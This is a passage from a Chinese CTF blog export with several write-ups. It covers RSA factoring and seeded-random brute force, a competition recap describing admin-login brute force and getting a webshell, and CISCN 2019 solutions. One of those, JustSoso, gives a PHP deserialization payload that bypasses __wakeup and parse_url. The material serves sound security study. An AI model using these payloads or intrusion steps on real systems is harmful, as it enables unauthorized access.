class="built_in">print</span>(n2)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line">c2=<span class="number">2468578221703379861458008098241051507850837382948845085288946175636556753744182763176189585173648323464054032011039944322939163396161712722541432975739789351064988098201326803586126788175259878398963744821667593495161587855894677387881240566285601934559118064797092685909593247713834262369686831071897653756217369182373679039639016628932948775518889507209432291038498366540263588850133348471811624348709494110881127292350302658720685976197632586315945770832849119141593343924518836983738868912332048462058640564551286493338707636203013048694776131295632886983835291684044170004544049944003732133038154121113518892438</span></span><br><span class="line">n2=<span class="number">15155267112260254814859334094046172735826002259080171081726998162357946701645037659523881592272031544049749021927125983252197909993392636398184049160807707719999605547760868696059871234441249045293267592302009677249269002811886149589869652213333369608947939768457152200437978105250737118847430275142343554191304134468404921824671763164876924921101985937224297479095246132228051655664880892772136476378294042631659251586654877292836243536438334288184387617801131434535466414123998495813296765847561162680781100446656391077184870802746066619879552452560641945080540683058930700833439189784657690146144976738557801495769</span></span><br><span class="line">n1=<span class="number">449389319572014470973230701130712522617269811294117721031111991008431585050360094769229957883125144692171901233101564003762866045169460601700254891441878998743810037070537170855056466702105713343963726437141651081516150688905082129849562489646846756872586122801890652177495174154676725874072596207108180178755008058522945203093993733331873167443162263746938403044201113440457668163574342481361454421154163291201432319013385234751292922268166299917246608164679144459355173725895117315662317330324505156929077922670671914823996700321766811999551043586214703010131467697982137884162143358399786007967117340789211505834848813471803797101083738140019127129356248286854522464787917597152171952002118368747491099723673529923018951195522714900400225757160886780159504182902140132857743474716967975019342128486236748643365288547828026395873270777532526144687248477070253203339428149026199554962987646174586568177797380361174318868448467648171416588868990979461995030684403161898497550408697577695094783000808003197203603068043364687265824456069673330314452567416143754983137647607219859034406220590219587869898727679465514015732749105798134650890143215022311113143974714405713221391896497966231925409438383535066648782822255201778169275281703</span></span><br><span class="line">c1=<span class="number">401489532945377793610793684722119773544780301600066410745513430092738470870254235710677331662917458735216486816223654944666672512914069274195244871184555059503843032370247894353363929996813688885280857203101709839776411016868985545599944237897372546401710041402579657231598311853522596463296090177664832759103736040102780428858301594805054838853076238331373482465072766841859415172741329175814259920949065993852870119473982972519779774470087935094963692097673607052443800723940091927016071427616754775915389245004208964143538205414854133746775614714447645057516665851780628694481268861808310238416724971673673850671343955386054575121362377868533055225219936712709474708031320743579595394353267596208729974198335174409673325772679039734706841988107519076516144633301371408301344929883397145523702189363308278963683356102257750758738297143036846718834812930796483716912661191147997005333798193659914573185697664706530774799114804036170190966523509331071964600280701252628276934131586398546602582672541075820188456265586487083315680880306767899236884202195162421559689536613740573005749847000477194096162091015847386298782974979446476432285118251267512895876728805199744415821498028998351171848530921695254428997423725875714923331577073</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>因为p和q十分接近，所以可以使用yafu直接分解：</p>
<p><img src="https://i.loli.net/2021/06/23/N2DALT3qCenVFkX.png" alt="image-20210623210851605"></p>
<p>可以解得：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p2 = <span class="number">123106730572541218855605566021385436071765753262738029208958530903965781875227909642974714736010685670143580347743415357832685249865725150245921795069888441073829479429807586105897472912969591388975228566729202050232896382465835682108694199213251295570982696527682862415340158808173324606996424204650675860599</span></span><br><span class="line">q2 = <span class="number">123106730572541218855605566021385436071765753262738029208958530903965781875227909642974714736010685670143580347743415357832685249865725150245921795069888441073829479429807586105897472912969591388975228566729202050232896382465835682108694199213251295570982696527682862415340158808173324606996424204650675862831</span></span><br><span class="line">e2 = <span class="number">196611</span></span><br><span class="line">phi = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = gmpy2.invert(e2, phi)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m2)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p><code>time.struct_time(tm_year=2021, tm_mon=4, tm_mday=28, tm_hour=20, tm_min=42, tm_sec=6, tm_wday=2, tm_yday=118, tm_isdst=0)3.1603143215179443</code></p>
<p>爆破：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n1=<span class="number">449389319572014470973230701130712522617269811294117721031111991008431585050360094769229957883125144692171901233101564003762866045169460601700254891441878998743810037070537170855056466702105713343963726437141651081516150688905082129849562489646846756872586122801890652177495174154676725874072596207108180178755008058522945203093993733331873167443162263746938403044201113440457668163574342481361454421154163291201432319013385234751292922268166299917246608164679144459355173725895117315662317330324505156929077922670671914823996700321766811999551043586214703010131467697982137884162143358399786007967117340789211505834848813471803797101083738140019127129356248286854522464787917597152171952002118368747491099723673529923018951195522714900400225757160886780159504182902140132857743474716967975019342128486236748643365288547828026395873270777532526144687248477070253203339428149026199554962987646174586568177797380361174318868448467648171416588868990979461995030684403161898497550408697577695094783000808003197203603068043364687265824456069673330314452567416143754983137647607219859034406220590219587869898727679465514015732749105798134650890143215022311113143974714405713221391896497966231925409438383535066648782822255201778169275281703</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_prime</span>(<span class="params">bits,dd</span>):</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gmpy2.is_prime(x) == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">if</span> dd== time_end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print (round(time.time(),5))</span></span><br><span class="line">        random.seed(<span class="built_in">round</span>(dd,<span class="number">5</span>))</span><br><span class="line">        x = random.getrandbits(bits)</span><br><span class="line">        dd+=<span class="number">0.00001</span></span><br><span class="line">    <span class="keyword">return</span> x, dd</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d, time_start = get_prime(<span class="number">2048</span>, time_start)</span><br><span class="line">        <span class="built_in">print</span> (time_start)</span><br><span class="line">        <span class="keyword">if</span> n1%d==<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(d)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">15360610070658756452775981220974692269754488069112447574228228635172518259707134514408315074592577390698594736605248087796101036697451547100410265895327560411294149316110964728238874696235929203731881998113781125348646341501219405620572607850544026471698636266490132324671879327975938781232776798316450395970997145320000569958972563105862963186117576276208073997763946153235287770074359557092366500382435482039438236868834374950888321780977585512229188837801768702376220882499000782771015183089522410298091322352922782284547034389739802236095714242735319203659400058027730963273141420889040535277149816754727342652031</span></span><br><span class="line">q = <span class="number">29255955167459173822029202653748208731665372392075310136166091626575381119996561344943898926895111560376898745160876509298700464980231887621948926920057583752649963205840641291654838365453417505593997914971784293790085743184284527598476737057527689694922200354165364024522488494310943036055262843225458488560113074237945109027019763172911986120412620473828687488483196046813755180263850690491049425246819627692939001093191158687966930218499663030472933603946985975956492839271737062304560756111632672448716026348929763876173656518558040564823003900583478638946595821096363093296973637163241707021374227978181941716313</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1=<span class="number">401489532945377793610793684722119773544780301600066410745513430092738470870254235710677331662917458735216486816223654944666672512914069274195244871184555059503843032370247894353363929996813688885280857203101709839776411016868985545599944237897372546401710041402579657231598311853522596463296090177664832759103736040102780428858301594805054838853076238331373482465072766841859415172741329175814259920949065993852870119473982972519779774470087935094963692097673607052443800723940091927016071427616754775915389245004208964143538205414854133746775614714447645057516665851780628694481268861808310238416724971673673850671343955386054575121362377868533055225219936712709474708031320743579595394353267596208729974198335174409673325772679039734706841988107519076516144633301371408301344929883397145523702189363308278963683356102257750758738297143036846718834812930796483716912661191147997005333798193659914573185697664706530774799114804036170190966523509331071964600280701252628276934131586398546602582672541075820188456265586487083315680880306767899236884202195162421559689536613740573005749847000477194096162091015847386298782974979446476432285118251267512895876728805199744415821498028998351171848530921695254428997423725875714923331577073</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = <span class="number">15360610070658756452775981220974692269754488069112447574228228635172518259707134514408315074592577390698594736605248087796101036697451547100410265895327560411294149316110964728238874696235929203731881998113781125348646341501219405620572607850544026471698636266490132324671879327975938781232776798316450395970997145320000569958972563105862963186117576276208073997763946153235287770074359557092366500382435482039438236868834374950888321780977585512229188837801768702376220882499000782771015183089522410298091322352922782284547034389739802236095714242735319203659400058027730963273141420889040535277149816754727342652031</span></span><br><span class="line">    q = <span class="number">29255955167459173822029202653748208731665372392075310136166091626575381119996561344943898926895111560376898745160876509298700464980231887621948926920057583752649963205840641291654838365453417505593997914971784293790085743184284527598476737057527689694922200354165364024522488494310943036055262843225458488560113074237945109027019763172911986120412620473828687488483196046813755180263850690491049425246819627692939001093191158687966930218499663030472933603946985975956492839271737062304560756111632672448716026348929763876173656518558040564823003900583478638946595821096363093296973637163241707021374227978181941716313</span></span><br><span class="line">    phi1 = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d1 = gmpy2.invert(<span class="number">65537</span>, phi1)</span><br><span class="line">    m = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line">    <span class="built_in">print</span> (<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>
<p>flag:<code>flag&#123;8b583646-13e8-5ef7-97c6-34b636591265&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>省赛总结</title>
    <url>/2018/10/30/CTF/%E7%9C%81%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><p>2018年10月20日</p>
<p>这次比赛作为华师代表队Check参与比赛，深深感觉自己的知识水平真的不够，题目做的太少了，还是以后要加强学习，学的太少了。题目都是web题目，web好久没做了，有点手生。比赛和CTF不同，主要是渗透测试。</p>
<ul>
<li>初赛题目四个，分别是两个内网题目，两个外网题目，外网平台分别是一个网上的APP下载平台，和一个Apache服务器。</li>
<li>APP下载平台利用方式<br>1.利用目录扫描工具，扫描目录，获取到后台目录admin和robots.txt,其中robots.txt存在一个flag，提交即可。<br>2.访问后台admin页面，可以看见登录页面。（偷偷用扫描页面扫过）没有其他漏洞，猜想存在弱口令秘密，试了几个，发现不行，想到爆破。<br>3.存在有一个安全码，可能是防止爆破，但是没什么卵用，查看页面源码，页面底部就有安全码，直接输入。bp一把梭，抓包导入字典爆破。得到密码：admin123，进入后台，后台底部就有一个flag。<br>4.有小tips，这个网站可以访问PHP页面，所以没必要上传什么木马了，直接插入就行了，然后菜刀一连，getshell，在桌面找到一个flag，提交。<br>5.还有一个falg，藏得页面有点深，感谢队友的仔细搜索。hhh</li>
<li>Apache服务器没有黑进去，有点尴尬。。。。<br>1.说一下找到的一个flag，实在目录下的，直接访问flag.txt,运气不错！hhh初赛简单的很，哈哈哈，感谢大佬手下留情。<br>2.因为后来对Apache服务器不熟悉，一开始方向错了，经验不够，后来时间不够，实在没进去。555555</li>
</ul>
<h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><p>2018年10月29日<br>线下赛真的菜，没办法，打的少，被虐了，呜呜呜<br>平台不熟悉,培训没去，也是坑点<br>一个获取的flag是利用ftp下载的flag，查看就行。因为人手不够没写exp，效率不够，得分少得可怜，惨兮兮。。。。</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
<li>要对各种平台有熟悉的了解，内网穿透什么的要有所涉及</li>
<li>常见的漏洞，字典平时要有点储备，爆破快速</li>
<li>线下赛分工一定要明确，做好自己的工作</li>
<li>学会写EXP，手动提交真的不够速度</li>
</ol>
<h2 id="吐槽："><a href="#吐槽：" class="headerlink" title="吐槽："></a>吐槽：</h2><p>不能联网，这点很服<br>为啥自己的服务器还要自己黑进去</p>
<h1 id="最后，自己太菜了，以后加油！！！"><a href="#最后，自己太菜了，以后加油！！！" class="headerlink" title="最后，自己太菜了，以后加油！！！"></a>最后，自己太菜了，以后加油！！！</h1><h1 id="好好学习"><a href="#好好学习" class="headerlink" title="好好学习"></a>好好学习</h1>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>info</tag>
      </tags>
  </entry>
  <entry>
    <title>第十二届全国大学生信息安全竞赛--Writeup</title>
    <url>/2019/04/23/CTF/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-Writeup/</url>
    <content><![CDATA[<p>Author: <a href="https://ch3cke.github.io/">ch3cke</a></p>
<span id="more"></span>
<h2 id="0x00-签到题"><a href="#0x00-签到题" class="headerlink" title="0x00 签到题"></a>0x00 签到题</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/签到题目.png" alt="签到"></p>
<p>文件连接：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/qiandao_32ac2a19cef66c300e29fafac57b9e1a%20(1">点击下载</a>.zip)</p>
<p>直接在本地运行，会调用摄像头识别人脸，如果有三个人出现就会在运行终端出现flag;(不过识别不是那么精确，感有时候一个人也可以)</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/签到.png" alt="签到flag"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">87</span>e37d95-<span class="number">6</span>a48-<span class="number">4463</span>-aff8-b0dbd27d3b7d&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x01-saleae"><a href="#0x01-saleae" class="headerlink" title="0x01 saleae"></a>0x01 saleae</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/seleae.png" alt="saleae"></p>
<p>文件地址：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/saleae_b73227737dbbfb7c966cf2ce2f7aeb7f.zip">点击下载</a></p>
<p>打开压缩包，发现是一个saleae.logicdata这样的文件，没见过，google一下，找到一点<a href="https://www.waitalone.cn/security-hardware-usb.html">资料</a>，下载软件，打开分析。</p>
<p>信道一：时钟信号</p>
<p>信道三：数据信号</p>
<p>设置一下，然后直接分析得到答案。（ps:也可以把数据信号的数据导出成二进制，然后转成字符。）</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/seleae-flag.png" alt="seleae——flag"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">12071397</span>-<span class="number">19</span>d1-<span class="number">48</span>e6-be8c-<span class="number">784</span>b89a95e07&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-24c"><a href="#0x03-24c" class="headerlink" title="0x03 24c"></a>0x03 24c</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/24c.png" alt="24c"></p>
<p>文件地址：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/24c_ee1ec3b00fd7a89be0db18fb299cf2ad.zip">点击下载</a></p>
<p>这题和上题的的数据差不多，不过所用的协议有点不同，采用的是i2c，这是<a href="https://blog.csdn.net/skyflying2012/article/details/8237881">详细介绍</a>，一样也是用Saleae Logic打开文件，分析采用i2c协议，可以看到有数据读写的过程。</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/24c-a.png" alt="24c-a"></p>
<p>但是存在一个坑点就是，这个东西需要你稍微看懂一点这个语法的意思，例如 <code>Setup Write to [&#39;160&#39;] + ACK</code> 意思是写入数据，ACK表述信号收到（可能不是那么标准），’ ’+ACK表示写入的地址，后面的是写入的数据，翻译：向设备的0x20(‘ ‘的ascill为0x20)处写入数据</p>
<p>然后，在信号结束的地方，有一个 <code>Setup Write to [&#39;160&#39;] +ACK \n \t+ACK</code> ,表明是把0x09、0x10位置的数据修改为ac，数据下标是从0开始的，一开始不小心疏忽了，一直错误。  </p>
<p>至于我是怎么理解的，<a href="https://tieba.baidu.com/p/4244941563?red_tag=1385763725">请看这个连接</a></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;c46dac10-e9b5-<span class="number">4</span>d90-a883-<span class="number">41</span>cf163bdf4e&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x03-usbasp"><a href="#0x03-usbasp" class="headerlink" title="0x03 * usbasp"></a>0x03 * usbasp</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/usbasp.png" alt=""></p>
<p>又是这个题目，还是这个软件，一样的打开方式，分析数据，发现采用的又变回SPI协议了，这个题目说起来。。。。很简单的，但是没有想到点上。这个信号不同的就是他的数据输入有点特别，所以我们在分析的时候需要做一点小小的设置。</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/usbasp-a.png" alt="usbasp-a"></p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/usbasp-c.png" alt="usbasp-c"></p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">flag&#123;85b084c6-<span class="number">42e6</span>-495c-<span class="number">87b4</span>-46dfb1df58a0&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-easyGo"><a href="#0x04-easyGo" class="headerlink" title="0x04 easyGo"></a>0x04 easyGo</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/easyGo.png" alt=""></p>
<p>文件地址：<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/easyGo_ec2819a048a8e908a90c3f5b9f8cd985.zip">点击下载</a></p>
<p>首先用IDA查看文件内容，发现是go语言编写的，ida无法识别函数名，有点难受。去找找ida逆向语言的插件—<a href="https://github.com/ch3cke/challenges/raw/master/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%9B%BD%E8%B5%9B/IDAGolangHelper-master.zip">IDAGolangHelper</a>。加载后，可以识别大部分函数名字。</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/easyGo-a.png" alt="easyGO"></p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/easyGo-b.png" alt="easyGo-b"></p>
<p>找到主函数：mian_main,f5一下。可以看到程序逻辑：</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/easyGo-c.png" alt="easyGo-c"></p>
<p>注意到有个比较，以前学过go语言,在这个题目里，”_”可以识别成“.” ,大部分都是包的调用，很好理解 。发现比较的两个值都在栈里，所以简单了，只要用pwndbg调试,在比较前下个断点，在栈面可以找到flag。</p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/easyGo-d.png" alt="easyGO-d"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">92094</span>daf-<span class="number">33</span>c9-<span class="number">431</span>e-a85a-<span class="number">8</span>bfbd5df98ad&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-JustSoso"><a href="#0x05-JustSoso" class="headerlink" title="0x05 JustSoso"></a>0x05 JustSoso</h2><p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/Justsoso.png" alt="Justsoso"></p>
<p>考察知识点：<a href="https://www.freebuf.com/column/148886.html">php伪协议</a>、<a href="https://www.freebuf.com/articles/web/167721.html">反序列化</a></p>
<p><img src="https://raw.githubusercontent.com/ch3cke/images/master/全国大学生信息安全竞赛12/Justsoso-a.png" alt="jsut"></p>
<p>打开题目可以看到有一个file参数，可以查看源码发现还有一个hint.php文件。先尝试用伪协议读取源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;  </span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>hint.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file,<span class="literal">true</span>);</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到unserialize和魔术方法就会想要利用反序列化漏洞</p>
<p>想到利用反序列化的漏洞，绕过__wakeup函数</p>
<p>由于handle是私有变量，因此payload应该是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">///</span></span><br><span class="line">index.php?file=hint.php&amp;payload=O:<span class="number">6</span>:<span class="string">&quot;Handle&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Handle%00handle&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;N;s:<span class="number">10</span>:<span class="string">&quot;token_flag&quot;</span>;R:<span class="number">4</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>利用php中的”&amp;”,，绕过随机数</p>
<p>利用”///“,<a href="http://www.am0s.com/functions/406.html">绕过parse_url</a></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">38</span>b3ff3b-<span class="number">3</span>ac0-<span class="number">4</span>a8e-a344-b75b0f23bb68&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>练习题(1)</title>
    <url>/2021/09/04/CTF/%E7%BB%83%E4%B9%A0%E9%A2%98-1/</url>
    <content><![CDATA[<p>几天做了几道逆向题，简单记录一下解题思路和过程</p>
<h2 id="Petition"><a href="#Petition" class="headerlink" title="Petition"></a>Petition</h2><p><a href="https://drive.google.com/file/d/1AjClukmJ8opf3QC_fkGQmMMoWWT7euYY/view?usp=sharing">程序链接</a><br>这个题目来自某次比赛的一个逆向题，比较有意思的是这个题目存在一些小小的问题，存在一些小小的反调试，题目中的数据操作大部分是异或操作，逆向起来直接反汇编无法分析程序，只能看汇编。<br>首先用IDA打开程序：<br><img src="https://i.loli.net/2021/09/04/KDo7S6Rw2Vfvpx1.png" alt=""></p>
<p>分析这个程序，可得这个程序的检验的方式是逐字符检验，一旦有某个字符错误，就会直接推出，根据题目的难度和数据操作的方式，现有两个解决方案：</p>
<ul>
<li>Pin 插桩</li>
<li>直接逆向<h3 id="直接逆向"><a href="#直接逆向" class="headerlink" title="直接逆向"></a>直接逆向</h3>这个需要分析一下程序的数据操作流程，根据动态调试可知，这个程序的流程是：</li>
</ul>
<ol>
<li>首先是将输入的数据与一个大数进行异或，取其最后八位</li>
<li>再将这个最后八位与函数里面的两个数据进行异或</li>
